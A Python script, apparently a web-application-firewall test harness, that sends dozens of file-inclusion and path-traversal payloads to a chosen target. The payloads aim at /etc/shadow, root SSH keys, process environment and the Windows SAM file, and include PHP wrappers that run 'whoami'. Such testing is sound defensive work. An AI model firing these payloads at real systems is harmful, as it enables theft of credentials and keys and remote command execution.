#!/usr/bin/env python3
"""
LFI / 路径遍历攻击测试脚本

覆盖注入点:
  - GET Query / Path
  - POST JSON / Form
  - Header / Cookie
  - PUT / PATCH

Payload 来源: Linux/Windows 系统文件读取、日志投毒、PHP 封装器、
              空字节截断、Unicode 规范化绕过、编码绕过等。
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from test_base import WAFTestBase, parse_args, Colors


class LFITester(WAFTestBase):
    ATTACK_NAME = "Local File Inclusion (LFI) / Path Traversal"
    ATTACK_DESC = "本地文件包含与路径遍历测试 — Linux/Windows 敏感文件、绕过技巧"

    GET_PAYLOADS = [
        # Linux 敏感文件
        ("linux-passwd", "../../../etc/passwd"),
        ("linux-passwd-deep", "../../../../../../../../etc/passwd"),
        ("linux-shadow", "../../../etc/shadow"),
        ("linux-hosts", "../../../etc/hosts"),
        ("linux-resolv", "../../../etc/resolv.conf"),
        ("linux-ssh-config", "../../../etc/ssh/sshd_config"),
        ("linux-ssh-private", "../../../root/.ssh/id_rsa"),
        ("linux-ssh-auth", "../../../root/.ssh/authorized_keys"),
        ("linux-apache-config", "../../../etc/apache2/apache2.conf"),
        ("linux-nginx-config", "../../../etc/nginx/nginx.conf"),
        ("linux-php-ini", "../../../etc/php/8.1/apache2/php.ini"),
        ("linux-mysql-config", "../../../etc/mysql/my.cnf"),
        ("linux-redis-config", "../../../etc/redis/redis.conf"),
        ("linux-cron", "../../../etc/crontab"),
        ("linux-environment", "../../../etc/environment"),
        ("linux-profile", "../../../etc/profile"),
        ("linux-bashrc", "../../../root/.bashrc"),
        ("linux-bash-history", "../../../root/.bash_history"),
        ("linux-proc-version", "../../../proc/version"),
        ("linux-proc-cmdline", "../../../proc/self/cmdline"),
        ("linux-proc-environ", "../../../proc/self/environ"),
        ("linux-proc-fd", "../../../proc/self/fd/0"),
        ("linux-proc-maps", "../../../proc/self/maps"),
        ("linux-proc-status", "../../../proc/self/status"),
        ("linux-var-log-auth", "../../../var/log/auth.log"),
        ("linux-var-log-apache", "../../../var/log/apache2/access.log"),
        ("linux-var-log-nginx", "../../../var/log/nginx/access.log"),
        ("linux-var-www", "../../../var/www/html/index.php"),
        ("linux-usr-bin", "../../../usr/bin/python3"),
        ("linux-usr-local-bin", "../../../usr/local/bin/node"),
        ("linux-tmp", "../../../tmp/sess_1234567890abcdef"),
        ("linux-dev-random", "../../../dev/random"),
        ("linux-dev-urandom", "../../../dev/urandom"),
        ("linux-dev-null", "../../../dev/null"),
        ("linux-dev-zero", "../../../dev/zero"),

        # Windows 敏感文件
        ("win-systemini", "..\\..\\..\\windows\\win.ini"),
        ("win-systemini-deep", "..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        ("win-bootini", "..\\..\\..\\boot.ini"),
        ("win-system32", "..\\..\\..\\windows\\system32\\config\\sam"),
        ("win-hosts", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"),
        ("win-iis-config", "..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config"),
        ("win-web-config", "..\\..\\..\\web.config"),
        ("win-asp-config", "..\\..\\..\\global.asax"),

        # 路径遍历变形
        ("traversal-dot", "....//....//....//etc/passwd"),
        ("traversal-dot2", "....\\....\\....\\windows\\win.ini"),
        ("traversal-double", "..%2f..%2f..%2fetc%2fpasswd"),
        ("traversal-double-back", "..%5c..%5c..%5cwindows%5cwin.ini"),
        ("traversal-url", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("traversal-url-back", "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"),
        ("traversal-unicode", "%c0%af%c0%af%c0%afetc/passwd"),
        ("traversal-unicode2", "%c1%9c%c1%9c%c1%9cetc/passwd"),
        ("traversal-null", "../../../etc/passwd%00"),
        ("traversal-null2", "../../../etc/passwd\x00"),

        # 编码绕过
        ("enc-double-url", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
        ("enc-utf8", "\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd"),
        ("enc-base64", "Li4vLi4vLi4vZXRjL3Bhc3N3ZA=="),
        ("enc-hex", "2e2e2f2e2e2f2e2e2f6574632f706173737764"),

        # PHP 封装器
        ("php-filter", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"),
        ("php-filter-2", "php://filter/read=string.rot13/resource=../../../etc/passwd"),
        ("php-input", "php://input"),
        ("php-data", "data://text/plain,<?php system('whoami'); ?>"),
        ("php-expect", "expect://whoami"),
        ("php-file", "file:///etc/passwd"),
        ("php-file-win", "file:///C:/windows/win.ini"),

        # 日志投毒路径
        ("log-apache", "../../../var/log/apache2/access.log"),
        ("log-nginx", "../../../var/log/nginx/access.log"),
        ("log-auth", "../../../var/log/auth.log"),
        ("log-syslog", "../../../var/log/syslog"),
        ("log-messages", "../../../var/log/messages"),

        # 空字节截断 + 扩展名绕过
        ("null-ext", "../../../etc/passwd%00.jpg"),
        ("null-ext2", "../../../etc/passwd\x00.jpg"),
        ("double-ext", "../../../etc/passwd.jpg.php"),
        ("case-ext", "../../../etc/passwd.PHP"),

        # 规范化绕过
        ("norm-dot", "./../../../etc/passwd"),
        ("norm-dot-slash", "/../../../etc/passwd"),
        ("norm-abs", "/etc/passwd"),
        ("norm-abs-win", "C:/windows/win.ini"),
        ("norm-abs-win2", "C:\\windows\\win.ini"),

        # 其他封装器
        ("wrapper-zip", "zip://shell.zip%23shell.php"),
        ("wrapper-phar", "phar://shell.phar/shell.php"),
        ("wrapper-bzip2", "compress.bzip2://../../../etc/passwd"),
        ("wrapper-zlib", "compress.zlib://../../../etc/passwd"),
        ("wrapper-glob", "glob://*.txt"),
    ]

    POST_PAYLOADS = [
        ("json-passwd", "../../../etc/passwd"),
        ("json-shadow", "../../../etc/shadow"),
        ("json-ssh", "../../../root/.ssh/id_rsa"),
        ("json-win-ini", "..\\..\\..\\windows\\win.ini"),
        ("json-php-filter", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"),
        ("json-php-file", "file:///etc/passwd"),
        ("json-traversal", "....//....//etc/passwd"),
        ("json-null", "../../../etc/passwd\x00"),
        ("json-proc", "../../../proc/self/environ"),

        ("form-passwd", "../../../etc/passwd"),
        ("form-win", "..\\..\\..\\windows\\win.ini"),
        ("form-php", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"),
        ("form-traversal", "....//....//etc/passwd"),
        ("form-log", "../../../var/log/apache2/access.log"),
    ]

    HEADER_PAYLOADS = [
        ("hdr-x-custom", "../../../etc/passwd"),
        ("hdr-ua-path", "Mozilla/5.0 ../../../etc/passwd"),
        ("hdr-referer-lfi", "http://evil.com/../../../etc/passwd"),
        ("hdr-xff-file", "file:///etc/passwd"),
    ]

    COOKIE_PAYLOADS = [
        ("cookie-passwd", "../../../etc/passwd"),
        ("cookie-php", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"),
        ("cookie-proc", "../../../proc/self/environ"),
    ]

    PATH_PAYLOADS = [
        ("path-passwd", "../../../etc/passwd"),
        ("path-win", "..\\..\\..\\windows\\win.ini"),
        ("path-php", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd"),
        ("path-traversal", "....//....//etc/passwd"),
    ]

    def run(self):
        print(f"  {Colors.c('正在执行 LFI / 路径遍历测试...', Colors.INFO)}\n")

        print(f"  {Colors.c('[注入点] GET Query', Colors.CYAN)}")
        for name, payload in self.GET_PAYLOADS:
            self.get_query(f"lfi-get-{name}", payload, "/api/file", "file")

        print(f"  {Colors.c('[注入点] GET Path', Colors.CYAN)}")
        for name, payload in self.PATH_PAYLOADS:
            self.get_path(f"lfi-path-{name}", payload, "/download")

        print(f"  {Colors.c('[注入点] POST JSON', Colors.CYAN)}")
        for name, payload in self.POST_PAYLOADS[:5]:
            self.post_json(f"lfi-json-{name}", payload, "/api/file", "path")

        print(f"  {Colors.c('[注入点] POST Form', Colors.CYAN)}")
        for name, payload in self.POST_PAYLOADS[5:]:
            self.post_form(f"lfi-form-{name}", payload, "/api/file", "path")

        print(f"  {Colors.c('[注入点] Header', Colors.CYAN)}")
        headers = ["X-Custom-Header", "User-Agent", "Referer", "X-Forwarded-For"]
        for i, (name, payload) in enumerate(self.HEADER_PAYLOADS):
            h = headers[i % len(headers)]
            self.header_inject(f"lfi-hdr-{name}", payload, h, "/api/echo")

        print(f"  {Colors.c('[注入点] Cookie', Colors.CYAN)}")
        for name, payload in self.COOKIE_PAYLOADS:
            self.cookie_inject(f"lfi-cookie-{name}", payload, "/api/echo")

        print(f"  {Colors.c('[注入点] PUT / PATCH', Colors.CYAN)}")
        for name, payload in [("put-passwd", "../../../etc/passwd"),
                               ("put-php", "php://filter/read=convert.base64-encode/resource=../../../etc/passwd")]:
            self.put_json(f"lfi-put-{name}", payload, "/api/config", "template")
            self.patch_json(f"lfi-patch-{name}", payload, "/api/config", "template")


if __name__ == "__main__":
    args = parse_args("LFI / 路径遍历攻击测试")
    tester = LFITester(
        target=args.target, domain=args.domain,
        verbose=args.verbose, timeout=args.timeout, delay=args.delay
    )
    tester.execute()
